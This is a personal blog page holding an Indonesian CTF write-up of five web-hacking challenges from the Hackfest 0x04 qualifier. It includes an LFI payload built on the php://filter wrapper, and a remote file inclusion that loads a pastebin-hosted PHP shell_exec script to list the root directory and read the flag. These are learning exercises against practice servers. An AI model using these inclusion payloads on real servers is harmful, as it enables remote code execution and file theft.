@@ -1,0 +1,328 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/_astro/me_transparent.DiKVjXeE_1MkkEL.png"><link rel="apple-touch-icon" href="/_astro/me_transparent.DiKVjXeE_1MkkEL.png"><meta name="generator" content="Astro v4.11.5"><!-- Canonical URL --><link rel="canonical" href="https://astro-micro.vercel.app/writeups/writeup-kualifikasi-ctf-hackfest-0x04-web-hacking/"><!-- Primary Meta Tags --><title>Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking | RafiPriatna.ID</title><meta name="title" content="Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking | RafiPriatna.ID"><meta name="description" content="WriteUp saya dalam acara CTF Hackfest Cyber Community Universitas Gunadarma (CCUG)."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://astro-micro.vercel.app/writeups/writeup-kualifikasi-ctf-hackfest-0x04-web-hacking/"><meta property="og:title" content="Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking | RafiPriatna.ID"><meta property="og:description" content="WriteUp saya dalam acara CTF Hackfest Cyber Community Universitas Gunadarma (CCUG)."><meta property="og:image" content="https://astro-micro.vercel.app/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://astro-micro.vercel.app/writeups/writeup-kualifikasi-ctf-hackfest-0x04-web-hacking/"><meta property="twitter:title" content="Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking | RafiPriatna.ID"><meta property="twitter:description" content="WriteUp saya dalam acara CTF Hackfest Cyber Community Universitas Gunadarma (CCUG)."><meta property="twitter:image" content="https://astro-micro.vercel.app/blog-placeholder-1.jpg"><!-- PageFind --><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script>
+  function init() {
+    preloadTheme();
+    onScroll();
+    animate();
+    updateThemeButtons();
+    addCopyCodeButtons();
+
+    const backToTop = document.getElementById("back-to-top");
+    backToTop?.addEventListener("click", (event) => scrollToTop(event));
+
+    const backToPrev = document.getElementById("back-to-prev");
+    backToPrev?.addEventListener("click", () => window.history.back());
+
+    const lightThemeButton = document.getElementById("light-theme-button");
+    lightThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "light");
+      toggleTheme(false);
+      updateThemeButtons();
+    });
+
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    darkThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "dark");
+      toggleTheme(true);
+      updateThemeButtons();
+    });
+
+    const systemThemeButton = document.getElementById("system-theme-button");
+    systemThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "system");
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+      updateThemeButtons();
+    });
+
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (event) => {
+        if (localStorage.theme === "system") {
+          toggleTheme(event.matches);
+        }
+      });
+
+    document.addEventListener("scroll", onScroll);
+  }
+
+  function updateThemeButtons() {
+    const theme = localStorage.getItem("theme");
+    const lightThemeButton = document.getElementById("light-theme-button");
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    const systemThemeButton = document.getElementById("system-theme-button");
+
+    function removeActiveButtonTheme(button) {
+      button?.classList.remove("bg-black/5");
+      button?.classList.remove("dark:bg-white/5");
+    }
+
+    function addActiveButtonTheme(button) {
+      button?.classList.add("bg-black/5");
+      button?.classList.add("dark:bg-white/5");
+    }
+
+    removeActiveButtonTheme(lightThemeButton);
+    removeActiveButtonTheme(darkThemeButton);
+    removeActiveButtonTheme(systemThemeButton);
+
+    if (theme === "light") {
+      addActiveButtonTheme(lightThemeButton);
+    } else if (theme === "dark") {
+      addActiveButtonTheme(darkThemeButton);
+    } else {
+      addActiveButtonTheme(systemThemeButton);
+    }
+  }
+
+  function animate() {
+    const animateElements = document.querySelectorAll(".animate");
+
+    animateElements.forEach((element, index) => {
+      setTimeout(() => {
+        element.classList.add("show");
+      }, index * 100);
+    });
+  }
+
+  function onScroll() {
+    if (window.scrollY > 0) {
+      document.documentElement.classList.add("scrolled");
+    } else {
+      document.documentElement.classList.remove("scrolled");
+    }
+  }
+
+  function scrollToTop(event) {
+    event.preventDefault();
+    window.scrollTo({
+      top: 0,
+      behavior: "smooth",
+    });
+  }
+
+  function toggleTheme(dark) {
+    const css = document.createElement("style");
+
+    css.appendChild(
+      document.createTextNode(
+        `* {
+             -webkit-transition: none !important;
+             -moz-transition: none !important;
+             -o-transition: none !important;
+             -ms-transition: none !important;
+             transition: none !important;
+          }
+        `
+      )
+    );
+
+    document.head.appendChild(css);
+
+    if (dark) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+
+    window.getComputedStyle(css).opacity;
+    document.head.removeChild(css);
+
+  }
+
+  function preloadTheme() {
+    const userTheme = localStorage.theme;
+
+    if (userTheme === "light" || userTheme === "dark") {
+      toggleTheme(userTheme === "dark");
+    } else {
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+    }
+  }
+
+  function addCopyCodeButtons() {
+    let copyButtonLabel = "📋";
+    let codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    async function copyCode(codeBlock, copyButton) {
+      const codeText = codeBlock.innerText;
+      const buttonText = copyButton.innerText;
+      const textToCopy = codeText.replace(buttonText, "");
+
+      await navigator.clipboard.writeText(textToCopy);
+      copyButton.innerText = "✅";
+
+      setTimeout(() => {
+        copyButton.innerText = copyButtonLabel;
+      }, 2000);
+    }
+
+    for (let codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const copyButton = document.createElement("button");
+      copyButton.innerText = copyButtonLabel;
+      copyButton.classList = "copy-code";
+
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      codeBlock.parentNode.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton?.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", () => init());
+  document.addEventListener("astro:after-swap", () => init());
+  preloadTheme();
+</script><link rel="stylesheet" href="/_astro/_slug_.Dz-_no8X.css">
+<link rel="stylesheet" href="/_astro/_slug_.Bg56fhso.css">
+<style>summary[data-astro-cid-xvrfupwn]{cursor:pointer;border-top-left-radius:.5rem;border-top-right-radius:.5rem;padding:.375rem .75rem;font-weight:500;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}summary[data-astro-cid-xvrfupwn]:hover{background-color:#0000000d}summary[data-astro-cid-xvrfupwn]:hover:is(.dark *){background-color:#ffffff0d}details[data-astro-cid-xvrfupwn][open] summary[data-astro-cid-xvrfupwn]{background-color:#0000000d}details[data-astro-cid-xvrfupwn][open] summary[data-astro-cid-xvrfupwn]:is(.dark *){background-color:#ffffff0d}
+</style><script type="module" src="/_astro/hoisted.Bfd9A_oI.js"></script></head> <body> <header data-astro-transition-persist="astro-l7r54iwe-1"> <div class="mx-auto max-w-screen-md px-4"> <div class="flex flex-wrap items-center justify-between"> <a href="/" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out">  <div class="flex items-center"> <img src="/_astro/me_transparent.DiKVjXeE_Z1Kx3TH.webp" alt="A bird sitting on a nest of eggs." loading="eager" width="50" height="50" decoding="async"> <div class="ml-1 grid hidden justify-items-start md:block"> <div class="font-semibold"> RafiPriatna.ID </div> <p class="text-xs">Lifelong Learner ✨</p> </div> </div>  </a> <nav class="flex items-center gap-4"> <a href="/blog" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Blog </a> <a href="/writeups" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Writeups </a> | <button id="magnifying-glass" aria-label="Search" class="flex items-center rounded transition-colors duration-300 ease-in-out hover:text-black focus-visible:text-black dark:border-white/20 dark:hover:text-white dark:focus-visible:text-white"> <svg height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.5 7C3.5 5.067 5.067 3.5 7 3.5C8.933 3.5 10.5 5.067 10.5 7C10.5 7.88461 10.1718 8.69256 9.63058 9.30876L9.30876 9.63058C8.69256 10.1718 7.88461 10.5 7 10.5C5.067 10.5 3.5 8.933 3.5 7ZM9.96544 11.0261C9.13578 11.6382 8.11014 12 7 12C4.23858 12 2 9.76142 2 7C2 4.23858 4.23858 2 7 2C9.76142 2 12 4.23858 12 7C12 8.11014 11.6382 9.13578 11.0261 9.96544L14.0303 12.9697L14.5607 13.5L13.5 14.5607L12.9697 14.0303L9.96544 11.0261Z" fill="currentColor"></path></svg>
+&nbsp;
+</button> </nav> </div> </div> </header> <main>  <div class="mx-auto max-w-screen-md px-4"> <div class="animate"> <a href="/writeups" class="not-prose group relative flex w-fit flex-nowrap rounded border border-black/15 py-1.5 pl-7 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-neutral-800 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white dark:bg-neutral-900"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm"> Back to writeups </div> </a> </div> <div class="animate my-10 space-y-1"> <div class="flex items-center gap-1.5"> <div class="font-base text-sm"> <time datetime="2021-04-01T13:40:20.000Z"> 01 April 2021 </time> </div>
+&bull;
+<div class="font-base text-sm"> Waktu baca: 4 menit </div> </div> <h1 class="text-3xl font-semibold text-black dark:text-white"> Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking </h1>  </div> <details open class="animate rounded-lg border border-black/15 bg-white dark:border-white/20 dark:bg-neutral-900" data-astro-cid-xvrfupwn> <summary data-astro-cid-xvrfupwn>Daftar Isi</summary> <nav class="" data-astro-cid-xvrfupwn> <ul class="py-3" data-astro-cid-xvrfupwn> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#bayi-ie" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Bayi IE </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#where-are-you-now" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Where Are You Now? </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#erfi-minta-tolong" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> eRFI Minta Tolong </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#bayi-kepala" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Bayi Kepala </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#bayi-robot" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out"> Bayi Robot </a>  </li> </ul> </nav> </details>  <article class="animate"> <p>Hackfest merupakan acara yang diselenggarakan oleh Cyber Community Unversitas Gunadarma (CCUG) untuk merekrut anggota baru untuk masuk ke tim mereka. Kebetulan saya mengikuti Hackfest 0x04. Berikut ini adalah writeup saya dalam menjawab soal-soal CTF Hackfest 0x04. Akan tetapi tidak semua writeup saya tulis, hanya kategori Web Hacking saja 😸</p>
+<h2 id="bayi-ie">Bayi IE</h2>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Ezz Parah Gak Usah Nanya (1)</span></span>
+<span class="line"><span>http://ccug.my.id:22121/</span></span>
+<span class="line"><span>Author: Ikhari</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:</p>
+<p><img  src="/_astro/Bayi_IE.CHwU-0Y1_1lLl74.webp" alt="Tampilan Web" width="1919" height="816" loading="lazy" decoding="async"></p>
+<p>Setelah itu, saya mencoba melihat page source dengan cara menekan CTRL + U. Didapatkan 1/3 dari flag seperti ini:</p>
+<p><img  src="/_astro/Bayi_IE_2.Bh0d-y1N_Z2ef414.webp" alt="Source code" width="1199" height="824" loading="lazy" decoding="async"></p>
+<p>Karena itu masih 1/3 bagian alias belum penuh, maka saya memutuskan untuk mencari lagi. Saya mencoba melihat file-file yang dimasukkan ke sini, yaitu semua css dan js. Lalu saya menemukan flag ke 2/3 di dalam file vegas.min.js</p>
+<p><img  src="/_astro/Bayi_IE_3.PFoFeC20_Z1IGzTK.webp" alt="vegas.min.js" width="699" height="172" loading="lazy" decoding="async"></p>
+<p>Saya juga menemukan flag ke 3/3 di dalam file templatemo-file.css</p>
+<p><img  src="/_astro/Bayi_IE_4.BdS3Zurv_pRvgj.webp" alt="templatemo-file.css" width="431" height="138" loading="lazy" decoding="async"></p>
+<p>Sehingga, flagnya dapat digabungkan dan dihasilkan:</p>
+<p><code>hackfest{IE_AdAlaH_Hal_PaLiNg_pEnTing_DAlaM_menCARI_iNfo}</code></p>
+<h2 id="where-are-you-now">Where Are You Now?</h2>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Hehehe boi</span></span>
+<span class="line"><span>http://ccug.my.id:20000/</span></span>
+<span class="line"><span>Author: aldo</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:</p>
+<p><img  src="/_astro/Where_Are_You_Now.Dswe9R87_271Wng.webp" alt="Tampilan awal" width="1666" height="219" loading="lazy" decoding="async"></p>
+<p>Saya membuka menu Flag, didapatkan tampilan seperti ini:</p>
+<p><img  src="/_astro/Where_Are_You_Now_2.BewILhMK_x7Su9.webp" alt="Halaman Flag" width="1363" height="139" loading="lazy" decoding="async"></p>
+<p>Lalu, saya melihat URLnya, didapatkan URL seperti ini:</p>
+<p><a href="http://ccug.my.id:20000/index.php?page=flag.php">http://ccug.my.id:20000/index.php?page=flag.php</a></p>
+<p>Saya berasumsi bahwa terdapat celah di bagian “page=”, yang mana bagian method get tersebut akan memasukkan file php sesuai dengan nama yang dimasukkan di URL. Sehingga, saya mencoba memasukkan PHP Wrapper menjadi seperti ini:</p>
+<p><a href="http://ccug.my.id:20000/index.php?page=php://filter/convert.base64-encode/resource=flag.php">http://ccug.my.id:20000/index.php?page=php://filter/convert.base64-encode/resource=flag.php</a></p>
+<p>Didapatkan hasil seperti ini:</p>
+<p><img  src="/_astro/Where_Are_You_Now_3.BfcIZ-ga_Z1n9t2C.webp" alt="Source flag.php tapi dihash base64" width="1919" height="363" loading="lazy" decoding="async"></p>
+<p>Karena masih menggunakan base64, akhirnya saya membuat script Python sederhana untuk menerjemahkan base64 tersebut:</p>
+<p><img  src="/_astro/Where_Are_You_Now_4.hpo2zIdN_1Oyhd2.webp" alt="Script Python3" width="1148" height="201" loading="lazy" decoding="async"></p>
+<p>Jalankan scriptnya dan dapat deh flagnya:</p>
+<p><img  src="/_astro/Where_Are_You_Now_5.9yMxFIxx_janxi.webp" alt="Output" width="622" height="152" loading="lazy" decoding="async"></p>
+<p><code>hackfest{tau_kan_harus_diapain_nih_flag?_ya_disubmit_lah:)}</code></p>
+<h2 id="erfi-minta-tolong">eRFI Minta Tolong</h2>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Flag jauh dari apa yang kamu liat:*</span></span>
+<span class="line"><span>http://ccug.my.id:20001/</span></span>
+<span class="line"><span>Author: aldo</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:</p>
+<p><img  src="/_astro/eRFI_Minta_Tolong.BNRjbvf-_Z16XAmN.webp" alt="Tampilan awal" width="881" height="148" loading="lazy" decoding="async"></p>
+<p>Saya mencoba cara yang sama seperti soal “Where Are You Now?”, dan didapatkan hasil seperti ini:</p>
+<p><img  src="/_astro/eRFI_Minta_Tolong_2.BhS9QCOL_1cqqbe.webp" alt="Output" width="600" height="134" loading="lazy" decoding="async"></p>
+<p>Karena bukan itu flagnya, maka saya mencoba cara lain, yaitu dengan cara eksekusi shell. Kenapa eksekusi shell? Karena di soalnya judulnya ‘RFI’ atau <em>Remote File Inclusion</em>, singkatnya RFI ini bisa membuat penyerang mengakses server korbannya. Saya membuat script php sederhana untuk eksekusi shell, menggunakan pastebin:</p>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>&#x3C;pre></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;?php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo shell_exec("ls /");</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>?></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;/pre></span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Setelah itu link raw dari pastebin saya masukkan sebagai parameter pada method “page=”</p>
+<p><a href="http://ccug.my.id:20001/index.php?page=https://pastebin.com/raw/sju0u1WZ">http://ccug.my.id:20001/index.php?page=https://pastebin.com/raw/sju0u1WZ</a></p>
+<p>Didapatkan tampilan seperti ini, di mana ini adalah list direktori dari root ”/”:</p>
+<p><img  src="/_astro/eRFI_Minta_Tolong_3.DFKPCdlV_ZkfRPw.webp" alt="Direktori Root" width="608" height="504" loading="lazy" decoding="async"></p>
+<p>Di sana terdapat file flagnya, sekarang tinggal dibaca menggunakan file wrapper yang dimasukkan sebagai parameter juga.</p>
+<p><a href="http://ccug.my.id:20001/index.php?page=file:///1Ni_fL4g_eUy.txt">http://ccug.my.id:20001/index.php?page=file:///1Ni_fL4g_eUy.txt</a></p>
+<p>Didapatkan flagnya:</p>
+<p><code>hackfest{widihhh_mantep_euy_tau_aja_ada_disini}</code></p>
+<h2 id="bayi-kepala">Bayi Kepala</h2>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Ezz Parah Gak Usah Nanya (2)</span></span>
+<span class="line"><span>http://ccug.my.id:22122/</span></span>
+<span class="line"><span>Author: Ikhari</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Saya mencoba mengakses url di soal menggunakan API Client Insomnia, lalu memeriksa bagian headersnya. Dan ditemukan flagnya.</p>
+<p><img  src="/_astro/Bayi_Kepala.CFIGkbvo_Z26wYnh.webp" alt="Insomnia" width="1143" height="350" loading="lazy" decoding="async"></p>
+<p><code>hackfest{YOU_EXPECTED_FLAG_!_BUT_IT_WAS_ME_DIO_!!!}</code></p>
+<h2 id="bayi-robot">Bayi Robot</h2>
+<pre class="astro-code astro-code-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Ezz Parah Gak Usah Nanya (3)</span></span>
+<span class="line"><span>http://ccug.my.id:22123/</span></span>
+<span class="line"><span>Author: Ikhari</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Saya mencoba mengakses url di soal lalu membuka robots.txt, dan didapatkan hasil seperti ini:</p>
+<p><img  src="/_astro/Bayi_Robot.DFRIKCS__1jRG8o.webp" alt="Robots.txt" width="360" height="197" loading="lazy" decoding="async"></p>
+<p>Setelah itu, saya membuka satu-satu filenya. Dan pada file NoRobotHere.txt saya mendapatkan kode base64:</p>
+<p><img  src="/_astro/Bayi_Robot_2.CrfVGo3v_GYn0A.webp" alt="NoRobotHere.txt" width="588" height="83" loading="lazy" decoding="async"></p>
+<p>Lalu encode base64 tersebut dan didapatkan flagnya:</p>
+<p><code>hackfest{FlaG_HAck_FeSt_0xo4}</code></p>
+<p>Sekian writeup dari saya, semoga bisa menambah ilmu teman-teman semua 😁</p> </article> </div>  </main> <footer class="animate"> <div class="mx-auto max-w-screen-md px-4"> <div class="relative"> <div class="absolute -top-12 right-0"> <button id="back-to-top" class="group relative flex w-fit flex-nowrap rounded border border-black/15 py-1.5 pl-8 pr-3 transition-colors duration-300 ease-in-out hover:text-black bg-white hover:bg-neutral-100 dark:hover:bg-neutral-800 dark:bg-neutral-900 focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 rotate-90 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm">Back to top</div> </button> </div> </div> <div class="flex items-center justify-between"> <div>&copy; 2024 • RafiPriatna.ID</div> <div class="flex flex-wrap items-center gap-1.5"> <button id="light-theme-button" aria-label="Light theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 dark:border-white/20 bg-white hover:bg-neutral-100 dark:hover:bg-neutral-800 dark:bg-neutral-900"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <button id="dark-theme-button" aria-label="Dark theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 dark:border-white/20 bg-white hover:bg-neutral-100 dark:hover:bg-neutral-800 dark:bg-neutral-900"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> </button> <button id="system-theme-button" aria-label="System theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 dark:border-white/20 bg-white hover:bg-neutral-100 dark:hover:bg-neutral-800 dark:bg-neutral-900"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect> <line x1="8" y1="21" x2="16" y2="21"></line> <line x1="12" y1="17" x2="12" y2="21"></line> </svg> </button> </div> </div> </div> </footer> <div id="backdrop" class="bg-[rgba(0, 0, 0, 0.5] invisible fixed left-0 top-0 z-50 flex h-screen w-full justify-center p-6 backdrop-blur-sm" data-astro-transition-persist="astro-t6dxx5el-2"> <div id="pagefind-container" class="m-0 flex h-fit max-h-[80%] w-full max-w-screen-sm flex-col overflow-auto rounded border border-black/15 bg-neutral-100 p-2 px-4 py-3 shadow-lg dark:border-white/20 dark:bg-neutral-900"> <div id="search" class="pagefind-ui pagefind-init" data-pagefind-ui data-bundle-path="/pagefind/" data-ui-options="{&#34;showImages&#34;:false,&#34;excerptLength&#34;:15,&#34;resetStyles&#34;:false}"></div>  <div class="mr-2 pb-1 pt-4 text-right text-xs dark:prose-invert">
+Tekan <span class="prose text-xs dark:prose-invert"><kbd class="">Esc</kbd></span> atau klik dimana saja untuk tutup.
+</div> </div> </div> <script>
+  const magnifyingGlass = document.getElementById("magnifying-glass");
+  const backdrop = document.getElementById("backdrop");
+
+  function openPagefind() {
+    const searchDiv = document.getElementById("search");
+    const search = searchDiv.querySelector("input");
+    setTimeout(() => {
+      search.focus();
+    }, 0);
+    search.placeholder = "Cari Artikel Apapun";
+    backdrop?.classList.remove("invisible");
+    backdrop?.classList.add("visible");
+  }
+
+  function closePagefind() {
+    const search = document.getElementById("search");
+    search.value = "";
+    backdrop?.classList.remove("visible");
+    backdrop?.classList.add("invisible");
+  }
+
+  // open pagefind
+  magnifyingGlass?.addEventListener("click", () => {
+    openPagefind();
+  });
+
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "/") {
+      e.preventDefault();
+      openPagefind();
+    } else if ((e.metaKey || e.ctrlKey) && e.key === "k") {
+      e.preventDefault();
+      openPagefind();
+    }
+  });
+
+  // close pagefind
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape" || e.keyCode === 27) {
+      closePagefind();
+    }
+  });
+
+  backdrop?.addEventListener("click", (event) => {
+    if (!event.target.closest("#pagefind-container")) {
+      closePagefind();
+    }
+  });
+
+  // prevent form submission
+  const form = document.getElementById("form");
+  form?.addEventListener("submit", (event) => {
+    event.preventDefault();
+  });
+</script>  </body></html>
